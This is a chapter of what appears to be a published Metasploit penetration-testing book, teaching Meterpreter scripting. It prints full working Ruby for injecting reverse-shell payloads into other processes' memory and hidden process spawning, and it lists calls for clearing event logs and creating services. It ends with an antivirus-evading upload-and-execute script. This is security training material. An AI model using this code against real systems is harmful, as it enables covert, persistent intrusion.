<html><head></head><body><section epub:type="chapter" id="meterpreter_scripting"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 16. Meterpreter Scripting</h2></div></div></div><p class="calibre2">Metasploit’s powerful scripting environment lets you add features or options to Meterpreter. In this chapter, you’ll learn the basics of Meterpreter scripting, some useful native calls, and learn how to run these commands from within Meterpreter. We’ll cover two ways to leverage Meterpreter scripting. The first method is somewhat outdated but still important, because not all scripts have been converted. The second method is nearly identical to the one discussed in <a class="xref" href="part0017.html#building_your_own_module">Chapter 13</a>, so we won’t cover it in detail in this chapter. (Special thanks to Carlos Perez [darkoperator] for his contributions to this chapter.)<a id="IDX-CHP-16-0001" class="strong"/><a id="IDX-CHP-16-0002" class="strong"/><a id="IDX-CHP-16-0003" class="strong"/><a id="IDX-CHP-16-0004" class="strong"/><a id="IDX-CHP-16-0005" class="strong"/><a id="IDX-CHP-16-0006" class="strong"/><a id="IDX-CHP-16-0007" class="strong"/><a id="IDX-CHP-16-0008" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="meterpreter_scripting_basics">Meterpreter Scripting Basics</h2></div></div></div><p class="calibre2">All Meterpreter scripts are located under the Framework root under <span class="strong"><em class="calibre4">scripts/meterpreter/</em></span>. To show a listing of all scripts, press the <span class="keycap">tab</span> key in a Meterpreter shell, enter <strong class="calibre3"><code class="calibre6">run</code></strong>, and press <span class="keycap">tab</span> again.</p><p class="calibre2">Let’s dissect a simple Meterpreter script and then build our own. We’ll explore the <code class="literal">multi_meter_inject</code> script that injects Meterpreter shells into different processes. To begin, take a look at this script in Meterpreter to see what flags and syntax are included:<a id="IDX-CHP-16-0009" class="strong"/><a id="IDX-CHP-16-0010" class="strong"/></p><a id="I_programlisting16_d1e18309" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run multi_meter_inject -h</code></strong>
Meterpreter script for injecting a reverse tcp Meterpreter
 payload into memory space of
multiple PID's. If none is provided, notepad.exe will be spawned and the meterpreter
payload injected into it.

OPTIONS:

    -h           Help menu.
    -m  <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>       Start Exploit multi/handler for return connection
    -mp <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>&lt;opt&gt;
  Provide Multiple PID for connections separated by comma one per IP.
    -mr <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>&lt;opt&gt;
  Provide Multiple IP Addresses for Connections separated by comma.
    -p  <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>&lt;opt&gt;  The
 port on the remote host where Metasploit is listening (default: 4444)
    -pt   &lt;opt&gt;  Specify Reverse Connection Meterpreter Payload. Default windows/
                     meterpreter/reverse_tcp

meterpreter &gt;</pre><p class="calibre2">The first option is the <code class="literal">-m</code> flag <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18343" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, which automatically sets up a new handler for us on the return connection. We would not need to set this option if we were going to use the same port (for example, 443). Next we specify the process IDs (PIDs) <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18349" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> that we need and the shells into which they will be injected.</p><p class="calibre2">Meterpreter executes in memory only. When we inject into a process, we are injecting Meterpreter into the memory space of that process. This allows us to remain stealthy, never reading or writing files to disk, while ultimately having multiple shells available to us.</p><p class="calibre2">We then set the IP address <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18359" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> and port number <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18365" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> on the attacking machine to which we want the new Meterpreter session to connect.</p><p class="calibre2">We issue the <code class="literal">ps</code> command within Meterpreter to get a list of running processes:</p><a id="I_programlisting16_d1e18376" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">ps</code></strong>

Process list
============

 PID   Name                 Arch  Session  User                  Path
 ---   ----                 ----  -------  ----                  ----
 0     [System Process]
 4     System
 256   smss.exe
 364   csrss.exe
 412   wininit.exe
 424   csrss.exe
 472   winlogon.exe
 516   services.exe
 524   lsass.exe
 532   lsm.exe
 2808  iexplorer.exe <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>     x86
meterpreter &gt;</pre><p class="calibre2">We’ll inject our new Meterpreter shell into the <span class="strong"><em class="calibre4">iexplorer.exe</em></span> <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18392" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> process. This will spawn a second Meterpreter console completely within memory and will never write data to the disk.<a id="IDX-CHP-16-0011" class="strong"/><a id="IDX-CHP-16-0012" class="strong"/></p><p class="calibre2">Let’s run the <code class="literal">multi_meter_inject</code> command using some of the switches we reviewed earlier to see if it works:</p><a id="I_programlisting16_d1e18410" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run multi_meter_inject -mp 2808 -mr 172.16.32.129 -p 443</code></strong>
  [*] Creating a reverse meterpreter stager: LHOST=172.16.32.129 LPORT=443
  [*] Injecting meterpreter into process ID 2808
  [*] Allocated memory at address 0x03180000, for 290 byte stager
  [*] Writing the stager into memory...
  [*] Sending stage (749056 bytes) to 172.16.32.170
  [+] Successfully injected Meterpreter in to process: 2808
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> [*] Meterpreter session 3 opened (172.16.32.129:443 -&gt; 172.16.32.170:1098) at
      Tue Nov 30 22:37:29 −0500 2010
  meterpreter &gt;</pre><p class="calibre2">As this output indicates, our command was successful and a new Meterpreter session has been opened, as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18423" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>.</p><p class="calibre2">Now that you understand what this script can do, let’s examine how it works. We’ll break the script into chunks to help us parse its commands and overall structure.</p><p class="calibre2">First, variables and definitions are defined and the flags we want to pass to Meterpreter are set up:</p><a id="I_programlisting16_d1e18433" class="strong"/><pre class="programlisting"># $Id: multi_meter_inject.rb 10901 2010-11-04 18:42:36Z darkoperator $
  # $Revision: 10901 $
  # Author: Carlos Perez at carlos_perez[at]darkoperator.com
  #-----------------------------------------------------------------------------
  ################## Variable Declarations ##################

  @client  = client
  lhost    = Rex::Socket.source_address("1.2.3.4")
  lport    = 4444
  lhost    = "127.0.0.1"
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> pid = nil
  multi_ip = nil
  multi_pid = []
  payload_type = "windows/meterpreter/reverse_tcp"
  start_handler = nil
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> @exec_opts = Rex::Parser::Arguments.new(
          "-h"  =&gt; [ false,  "Help menu." ],
          "-p"  =&gt; [ true,   "The port on the remote host where
 Metasploit is              listening (default: 4444)"],
          "-m"  =&gt; [ false,  "Start Exploit multi/handler for return connection"],
          "-pt" =&gt; [ true,   "Specify Reverse Connection
 Meterpreter Payload.              Default windows/meterpreter/reverse_tcp"],
          "-mr" =&gt; [ true,   "Provide Multiple IP Addresses
 for Connections              separated by comma."],
          "-mp" =&gt; [ true,   "Provide Multiple PID for connections
 separated by              comma one per IP."]
  )
  meter_type = client.platform</pre><p class="calibre2">At the beginning of this section of script, notice that several variables are defined for later use. For example, <code class="literal">pid = nil</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18452" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> creates a PID variable but its value is not set. The <code class="literal">@exec_opts = Rex::Parser::Arguments.new(</code> section at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18461" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> defines the additional help commands and flags that will be used.<a id="IDX-CHP-16-0013" class="strong"/><a id="IDX-CHP-16-0014" class="strong"/><a id="IDX-CHP-16-0015" class="strong"/><a id="IDX-CHP-16-0016" class="strong"/></p><p class="calibre2">The next section defines functions that we will call later:</p><a id="I_programlisting16_d1e18482" class="strong"/><pre class="programlisting">################## Function Declarations ##################

  # Usage Message Function
  #-------------------------------------------------------------------------------
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> def usage
          print_line "Meterpreter Script for injecting a reverse
 tcp Meterpreter Payload"
          print_line "in to memory of multiple PID's, if none is
 provided a notepad process."
          print_line "will be created and a Meterpreter Payload
 will be injected in to each."
          print_line(@exec_opts.usage)
          raise Rex::Script::Completed
  end

  # Wrong Meterpreter Version Message Function
  #-------------------------------------------------------------------------------
  def wrong_meter_version(meter = meter_type)
          print_error("#{meter} version of Meterpreter is not
 supported with this Script!")
          raise Rex::Script::Completed
  end

  # Function for injecting payload in to a given PID
  #-------------------------------------------------------------------------------
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> def inject(target_pid, payload_to_inject)
          print_status("Injecting meterpreter into process ID #{target_pid}")
          begin
                  host_process = @client.sys.process.open
(target_pid.to_i, PROCESS_ALL_ACCESS)
                  raw = payload_to_inject.generate
                <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

                  print_status("Allocated memory at
 address #{"0x%.8x" % mem}, for                       #{raw.length} byte stager")
                  print_status("Writing the stager into memory...")
                <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>host_process.memory.write(mem, raw)
                <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>host_process.thread.create(mem, 0)
                  print_good("Successfully injected Meterpreter
 in to process: #{target_pid}")
          rescue::Exception =&gt; e
                  print_error("Failed to Inject Payload to #{target_pid}!")
                  print_error(e)
          end
  end</pre><p class="calibre2">In this example, the function <code class="literal">usage</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18519" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> will be called when the <code class="literal">-h</code> flag is set. You can call a number of Meterpreter functions directly from the Meterpreter API. This functionality simplifies certain tasks, such as injecting into a new process with the <code class="literal">def inject</code> function, as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18531" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>.</p><p class="calibre2">The next important element is the <code class="literal">host_process.memory.allocate</code> call at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18542" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, which will allow us to allocate memory space for our Meterpreter payload. We then write the memory to our process using <code class="literal">host_process.memory.write</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18551" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> and create a new thread using <code class="literal">host_process.thread.create</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e18561" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span>.<a id="IDX-CHP-16-0017" class="strong"/><a id="IDX-CHP-16-0018" class="strong"/><a id="IDX-CHP-16-0019" class="strong"/><a id="IDX-CHP-16-0020" class="strong"/></p><p class="calibre2">Next we define the multi-handler that handles the connections based on the selected payload, as shown in boldface in the following output. (The default is Meterpreter, so the multi-handler will handle Meterpreter sessions unless otherwise specified.)</p><a id="I_programlisting16_d1e18582" class="strong"/><pre class="programlisting"># Function for creation of connection handler
#-------------------------------------------------------------------------------
<strong class="calibre3"><code class="calibre6">def create_multi_handler(payload_to_inject)</code></strong>
        mul = @client.framework.exploits.create("multi/handler")
        mul.share_datastore(payload_to_inject.datastore)
        mul.datastore['WORKSPACE'] = @client.workspace
        mul.datastore['PAYLOAD'] = payload_to_inject
        mul.datastore['EXITFUNC'] = 'process'
        mul.datastore['ExitOnSession'] = true
        print_status("Running payload handler")
        mul.exploit_simple(
                'Payload'  =&gt; mul.datastore['PAYLOAD'],
                'RunAsJob' =&gt; true
        )

end</pre><p class="calibre2">The <code class="literal">pay = client.framework.payloads.create(payload)</code> call in the following section allows us to create a payload from the Metasploit Framework. Because we know this is a Meterpreter payload, Metasploit will automatically generate it for us.</p><a id="I_programlisting16_d1e18592" class="strong"/><pre class="programlisting"># Function for Creating the Payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
        print_status("Creating a reverse meterpreter
 stager: LHOST=#{lhost} LPORT=#{lport}")
        payload = payload_type
        <strong class="calibre3"><code class="calibre6">pay = client.framework.payloads.create(payload)</code></strong>
        pay.datastore['LHOST'] = lhost
        pay.datastore['LPORT'] = lport
        return pay
end</pre><p class="calibre2">The next option spawns a process using Notepad by default. If we didn’t specify a process, it would have created a Notepad process for us automatically.<a id="IDX-CHP-16-0021" class="strong"/></p><a id="I_programlisting16_d1e18602" class="strong"/><pre class="programlisting"># Function that starts the notepad.exe process
#-------------------------------------------------------------------------------
def start_proc()
        print_good("Starting Notepad.exe to house Meterpreter Session.")
        <strong class="calibre3"><code class="calibre6">proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' =&gt; true })</code></strong>
        print_good("Process created with pid #{proc.pid}")
        return proc.pid
end</pre><p class="calibre2">The boldfaced call lets us execute any command on the operating system. Notice that <code class="literal">Hidden</code> is set to <code class="literal">true</code>. This means that the user on the other side (the target) will not see anything; if Notepad is opened, it will run without the target user’s knowledge.</p><p class="calibre2">Next we call our functions, throw if statements, and start the payload:</p><a id="I_programlisting16_d1e18617" class="strong"/><pre class="programlisting">################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
        case opt
        when "-h"
                usage
        when "-p"
                lport = val.to_i
        when "-m"
                start_handler = true
        when "-pt"
                payload_type = val
        when "-mr"
                multi_ip = val.split(",")
        when "-mp"
                multi_pid = val.split(",")
        end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !˜ /win32|win64/i
# Create a Multi Handler is Desired
create_multi_handler(payload_type) if start_handler</pre><p class="calibre2">Finally, we go through a couple of checks, make sure the syntax is correct, and inject our new Meterpreter session into our PID:</p><a id="I_programlisting16_d1e18621" class="strong"/><pre class="programlisting"># Check for a PID or program name

if multi_ip
        if multi_pid
                if multi_ip.length == multi_pid.length
                        pid_index = 0
                        multi_ip.each do |i|
                                payload = create_payload(payload_type,i,lport)
                                inject(multi_pid[pid_index],payload)
                                select(nil, nil, nil, 5)
                                pid_index = pid_index + 1
                        end
                else
                        multi_ip.each do |i|
                                payload = create_payload(payload_type,i,lport)
                                inject(start_proc,payload)
                                select(nil, nil, nil, 2)
                        end
                end
        end
else
        print_error("You must provide at least one IP!")
end</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="meterpreter_api">Meterpreter API</h2></div></div></div><p class="calibre2">During a penetration test, you might be unable to find an existing script that matches what you need in order to perform a required task. If you understand the basic concepts of programming, it should be relatively easy for you to pick up the Ruby syntax and use it to write additional scripts.<a id="IDX-CHP-16-0022" class="strong"/><a id="IDX-CHP-16-0023" class="strong"/><a id="IDX-CHP-16-0024" class="strong"/><a id="IDX-CHP-16-0025" class="strong"/><a id="IDX-CHP-16-0026" class="strong"/><a id="IDX-CHP-16-0027" class="strong"/><a id="IDX-CHP-16-0028" class="strong"/><a id="IDX-CHP-16-0029" class="strong"/></p><p class="calibre2">Let’s start off with a basic print statement that uses the interactive Ruby shell, also known as <code class="literal">irb</code>. From the Meterpreter console, issue the <strong class="calibre3"><code class="calibre6">irb</code></strong> command and begin typing commands:<a id="IDX-CHP-16-0030" class="strong"/></p><a id="I_programlisting16_d1e18671" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">irb</code></strong>
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
&gt;&gt;</pre><p class="calibre2">After you are inside the interactive shell, you can use it to test the different API calls from Meterpreter.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="printing_output">Printing Output</h3></div></div></div><p class="calibre2">Let’s start with the <code class="literal">print_line()</code> call, which will print the output and add a carriage return at the end:</p><a id="I_programlisting16_d1e18686" class="strong"/><pre class="programlisting">&gt;&gt; <strong class="calibre3"><code class="calibre6">print_line("you have been pwnd!")</code></strong>
you have been pwnd!
=&gt; nil</pre><p class="calibre2">The next call is <code class="literal">print_status()</code> and is used most often in the scripting language. This call will provide a carriage return and print the status of whatever is executing, with a <code class="literal">[*]</code> prefixed at the beginning:</p><a id="I_programlisting16_d1e18699" class="strong"/><pre class="programlisting">&gt;&gt; <strong class="calibre3"><code class="calibre6">print_status("you have been pwnd!")</code></strong>
[*] you have been pwnd!
=&gt; nil</pre><p class="calibre2">The next call is <code class="literal">print_good()</code>, which is used to provide the results of an action or to indicate that the action was successful:</p><a id="I_programlisting16_d1e18709" class="strong"/><pre class="programlisting">&gt;&gt; <strong class="calibre3"><code class="calibre6">print_good("you have been pwnd")</code></strong>
[+] you have been pwnd
=&gt; nil</pre><p class="calibre2">The next call is <code class="literal">print_error()</code>, which is used to provide an error message or to indicate that an action was not possible:<a id="IDX-CHP-16-0031" class="strong"/><a id="IDX-CHP-16-0032" class="strong"/><a id="IDX-CHP-16-0033" class="strong"/><a id="IDX-CHP-16-0034" class="strong"/><a id="IDX-CHP-16-0035" class="strong"/><a id="IDX-CHP-16-0036" class="strong"/><a id="IDX-CHP-16-0037" class="strong"/><a id="IDX-CHP-16-0038" class="strong"/><a id="IDX-CHP-16-0039" class="strong"/><a id="IDX-CHP-16-0040" class="strong"/><a id="IDX-CHP-16-0041" class="strong"/><a id="IDX-CHP-16-0042" class="strong"/></p><a id="I_programlisting16_d1e18762" class="strong"/><pre class="programlisting">&gt;&gt; <strong class="calibre3"><code class="calibre6">print_error("you have been pwnd!")</code></strong>
[-] you have been pwnd!
=&gt; nil</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="base_api_calls">Base API Calls</h3></div></div></div><p class="calibre2">Meterpreter includes many API calls that you can use in your scripts to provide additional functionality or customization. You can use several reference points for these API calls. The one most often used by scripting newbies looks at how the Meterpreter console user interface (UI) uses the calls; these can be used as a base to continue writing scripts. To access this code, read the files under <span class="strong"><em class="calibre4">/opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/command_dispatcher/</em></span> in Back|Track. If you create a listing of the folder contents, you can see the files that contain various commands that you can use:</p><a id="I_programlisting16_d1e18775" class="strong"/><pre class="programlisting">root@bt:˜# <strong class="calibre3"><code class="calibre6">ls -F /opt/framework3/</code></strong>
<strong class="calibre3"><code class="calibre6">msf3/lib/rex/post/meterpreter/ui/console/command_dispatcher/</code></strong>

core.rb  espia.rb  incognito.rb  networkpug.rb  priv/
  priv.rb  sniffer.rb  stdapi/  stdapi.rb</pre><p class="calibre2">Within these scripts are the various Meterpreter core, desktop interaction, privileged operations, and many more commands. Review these scripts to become intimately familiar with how Meterpreter operates within a compromised system.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="meterpreter_mixins">Meterpreter Mixins</h3></div></div></div><p class="calibre2">The Meterpreter mixins are a series of calls that represent the most common tasks undertaken in a Meterpreter script. These calls are not available in <code class="literal">irb</code> and can be used only when creating a script for Meterpreter. Following is a list of some of the most notable calls:<a id="IDX-CHP-16-0043" class="strong"/><a id="IDX-CHP-16-0044" class="strong"/><a id="IDX-CHP-16-0045" class="strong"/><a id="IDX-CHP-16-0046" class="strong"/><a id="IDX-CHP-16-0047" class="strong"/><a id="IDX-CHP-16-0048" class="strong"/><a id="IDX-CHP-16-0049" class="strong"/></p><table class="simplelist"><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">cmd_exec(cmd)</code></strong> Executes the given command as hidden and channelized. The output of the command is provided as a multiline string.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">eventlog_clear(evt = "")</code></strong> Clears a given event log or all event logs if none is given. Returns an array of event logs that were cleared.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">eventlog_list()</code></strong> Enumerates the event logs and returns an array containing the names of the event logs.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">file_local_digestmd5(file2md5)</code></strong> Returns a string with the MD5 checksum of a given local file.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">file_local_digestsha1(file2sha1)</code></strong> Returns a string with the SHA1 checksum of a given local file.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">file_local_digestsha2(file2sha2)</code></strong> Returns a string with the SHA256 checksum of a given local file.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">file_local_write(file2wrt, data2wrt)</code></strong> Writes a given string to a specified file.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">is_admin?()</code></strong> Identifies whether or not the user is an admin. Returns <code class="literal">true</code> if the user is an admin and <code class="literal">false</code> if not.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">is_uac_enabled?()</code></strong> Determines whether User Account Control (UAC) is enabled on the system.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">registry_createkey(key)</code></strong> Creates a given registry key and returns <code class="literal">true</code> if successful.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">registry_deleteval(key,valname)</code></strong> Deletes a registry value given the key and value name. Returns <code class="literal">true</code> if successful.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">registry_delkey(key)</code></strong> Deletes a given registry key and returns <code class="literal">true</code> if successful.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">registry_enumkeys(key)</code></strong> Enumerates the subkeys of a given registry key and returns an array of subkeys.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">registry_enumvals(key)</code></strong> Enumerates the values of a given registry key and returns an array of value names.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">registry_getvaldata(key,valname)</code></strong> Returns the data of a given registry key and its value.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">registry_getvalinfo(key,valname)</code></strong> Returns the data and type of a given registry key and its value.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">registry_setvaldata(key,valname,data,type)</code></strong> Sets the data for a given value and type of data on the target registry. Returns <code class="literal">true</code> if successful.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">service_change_startup(name,mode)</code></strong> Changes a given service startup mode. The name and the mode must be provided. The mode is a string set with either a corresponding auto, manual, or disable setting. The service name is case sensitive.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">service_create(name, display_name, executable_on_host,startup=2)</code></strong> Function for the creation of a service that runs its own process. Its parameters are the service name as a string, the display name as a string, the path of the executable on the host that will execute at startup as a string, and the startup type as an integer: <code class="literal">2</code> for Auto, <code class="literal">3</code> for Manual, or <code class="literal">4</code> for Disable (default is Auto).</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">service_delete(name)</code></strong> Function for deleting a service by deleting the key in the registry.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">service_info(name)</code></strong> Gets Windows service information. The information is returned in a hash with display name, startup mode, and command executed by the service. The service name is case sensitive. Hash keys are <code class="literal">Name</code>, <code class="literal">Start</code>, <code class="literal">Command</code>, and <code class="literal">Credentials</code>.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">service_list()</code></strong> Lists all Windows services present. Returns an array containing the services’ names.</td></tr><tr class="calibre10"><td class="calibre11"><strong class="calibre3"><code class="calibre6">service_start(name)</code></strong> Function for service startup. Returns <code class="literal">0</code> if the service is started, <code class="literal">1</code> if the service is already started, and <code class="literal">2</code> if service is disabled.</td></tr><tr class="calibre12"><td class="calibre11"><strong class="calibre3"><code class="calibre6">service_stop(name)</code></strong> Function for stopping a service. Returns <code class="literal">0</code> if the service is stopped successfully, <code class="literal">1</code> if the service is already stopped or disabled, and <code class="literal">2</code> if the service cannot be stopped.</td></tr></table><p class="calibre2">You should understand the basics regarding the Meterpreter mixin calls that you can use to add functionality to your custom script.<a id="IDX-CHP-16-0050" class="strong"/><a id="IDX-CHP-16-0051" class="strong"/><a id="IDX-CHP-16-0052" class="strong"/><a id="IDX-CHP-16-0053" class="strong"/><a id="IDX-CHP-16-0054" class="strong"/></p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="rules_for_writing_meterpreter_scripts">Rules for Writing Meterpreter Scripts</h2></div></div></div><p class="calibre2">When creating Meterpreter scripts, you need to understand the following rules before you begin your first script and if you want them to be committed to the Framework:<a id="IDX-CHP-16-0055" class="strong"/><a id="IDX-CHP-16-0056" class="strong"/></p><div class="book"><ul class="itemizedlist"><li class="listitem">Use only instance, local, and constant variables; never use global or class variables because they might interfere with the Framework variables.</li><li class="listitem">Use hard tabs for indenting; do not use spaces.</li><li class="listitem">For code blocks, do not use <code class="literal">{}</code>. Instead, use <code class="literal">do</code> and <code class="literal">end</code>.</li><li class="listitem">When declaring functions, always write a comment before the declaration and provide a brief description of its purpose.</li><li class="listitem">Do not use <code class="literal">sleep</code>; use <code class="literal">"select(nil, nil, nil, &lt;time&gt;)"</code>.</li><li class="listitem">Do not use <code class="literal">puts</code> or any other standard output calls; instead use <code class="literal">print</code>, <code class="literal">print_line</code>, <code class="literal">print_status</code>, <code class="literal">print_error</code>, and <code class="literal">print_good</code>.</li><li class="listitem">Always include an <code class="literal">-h</code> option that will print a description and the purpose of the script and show the available options.</li><li class="listitem">If your script is meant for a specific operating system or Meterpreter platform, make sure it runs only on those platforms and prints out an error message for an unsupported OS or platform.</li></ul></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="creating_your_own_meterpreter_script">Creating Your Own Meterpreter Script</h2></div></div></div><p class="calibre2">Open up your favorite editor and create a new file called <span class="strong"><em class="calibre4">execute_upload.rb</em></span>, located in <span class="strong"><em class="calibre4">scripts/meterpreter/</em></span>. We’ll start by adding comments to the top of the file to let everyone know the purpose of this script and to define our options for the script:</p><a id="I_programlisting16_d1e19083" class="strong"/><pre class="programlisting"># Meterpreter script for uploading and executing another meterpreter exe

info = "Simple script for uploading and executing an additional meterpreter payload"

# Options

opts = Rex::Parser::Arguments.new(
        <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>"-h"  =&gt; [ false,
   "This help menu. Spawn a meterpreter shell by
 uploading and               executing."],
        <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>"-r"  =&gt; [ true,
    "The IP of a remote Metasploit listening for the connect back"],
        <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>"-p"  =&gt; [ true,    "The port
 on the remote host where Metasploit is listening               (default: 4444)"]
)</pre><p class="calibre2">This should look somewhat familiar, because it’s almost exactly the same as the example from Carlos Perez that appeared earlier in the chapter. The help message is defined with <code class="literal">-h</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19108" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, and <code class="literal">-r</code> and <code class="literal">-p</code> are specified for the remote IP address <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19120" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and port number <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19127" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> we’ll need for our new Meterpreter executable. Note that a <code class="literal">true</code> statement is included; this indicates that these fields are required.<a id="IDX-CHP-16-0057" class="strong"/></p><p class="calibre2">Next, we define the variables we want to use throughout the script. We’ll call the <code class="literal">Rex::Text.rand_text_alpha</code> function to create a unique executable name every time it’s called. This is efficient, because we don’t want to assign an executable name statically, which would “antivirus fingerprint” the attack. We’ll also configure each argument so that it either assigns a value or prints information with, for example, the <code class="literal">-h</code>.</p><a id="I_programlisting16_d1e19147" class="strong"/><pre class="programlisting">filename= Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
rhost    = Rex::Socket.source_address("1.2.3.4")
